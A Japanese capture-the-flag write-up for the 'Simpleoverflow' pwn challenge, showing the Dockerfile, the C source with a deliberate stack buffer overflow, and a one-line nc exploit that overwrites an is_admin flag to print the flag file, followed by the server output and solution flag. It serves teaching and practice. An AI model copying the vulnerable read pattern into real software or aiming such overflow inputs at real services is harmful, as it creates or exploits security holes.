# Simpleoverflow CTF Writeup

## 1. 概要

このチャレンジは、実行可能ファイル `chall` とそのソースコード `src.c`、そして実行環境を定義する `Dockerfile` などから構成されるPwn問題です。

目標は、サーバー上で実行されているプログラムの脆弱性を突いて、サーバー内にあるフラグファイル `flag.txt` の内容を読み取ることです。

## 2. 初期調査

### `Dockerfile` の解析

```dockerfile
FROM ubuntu:24.04 AS base
WORKDIR /app
COPY chall run
RUN echo "ctf4b{****}" > /app/flag.txt

FROM pwn.red/jail
COPY --from=base / /srv
RUN chmod +x /srv/app/run
ENV JAIL_TIME=120 JAIL_CPU=100 JAIL_MEM=10M
```

-   プログラム `chall` は `/srv/app/run` として実行される。
-   フラグは `/srv/app/flag.txt` に存在する。
-   `pwn.red/jail` というサンドボックス環境で、リソース制限（特にメモリ10MB）のもとで実行されることがわかります。

## 3. 脆弱性の分析

### `src.c` の解析

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  char buf[10] = {0};
  int is_admin = 0;
  printf("name:");
  read(0, buf, 0x10); // <-- VULNERABILITY
  printf("Hello, %s\n", buf);
  if (!is_admin) {
    puts("You are not admin. bye");
  } else {
    system("/bin/cat ./flag.txt");
  }
  return 0;
}
```

ソースコードの中心部分に、典型的な**スタックバッファオーバーフロー**の脆弱性が存在します。

-   `char buf[10]` でスタック上に10バイトのバッファが確保されます。
-   `read(0, buf, 0x10)` は、標準入力から**16バイト** (`0x10`) のデータを `buf` に読み込みます。
-   10バイトのバッファに16バイトのデータを書き込むため、6バイト分がバッファをあふれ、後続のスタック領域を上書きします。

スタック上では `buf` の後に `is_admin` 変数が配置されていると推測できます。この `is_admin` を `0` から `0` 以外の任意の値に上書きできれば、`system("/bin/cat ./flag.txt")` が実行され、フラグが手に入ります。

## 4. 攻撃（Exploit）

`buf` (10バイト) と、その後の `is_admin` を上書きするために、10バイトより大きいデータを送信します。最も簡単なペイロードは、ヌルバイトを含まない文字を16個送信することです。

以下のコマンドを実行しました。

```bash
(echo "AAAAAAAAAAAAAAAA"; cat) | nc 34.170.146.252 55740
```

-   `echo "AAAAAAAAAAAAAAAA"` で16バイトのペイロードを生成します。
-   パイプで `nc` に接続しますが、`echo`だけだとペイロード送信後に即座に接続が閉じてしまい、サーバーからの応答を受信できません。
-   そこで `( ... ; cat)` という構造を使い、`echo` の実行後も `cat` が標準入力を開き続けることで、`nc` の接続を維持し、サーバーからの出力を最後まで受信できるようにします。

## 5. 結果

上記のコマンドを実行すると、サーバーから以下の応答が返ってきました。

```
name:Hello, AAAAAAAAAAAAAAAA...
ctf4b{0n_y0ur_m4rk}
```

これにより、フラグの取得に成功しました。

### Flag: `ctf4b{0n_y0ur_m4rk}`

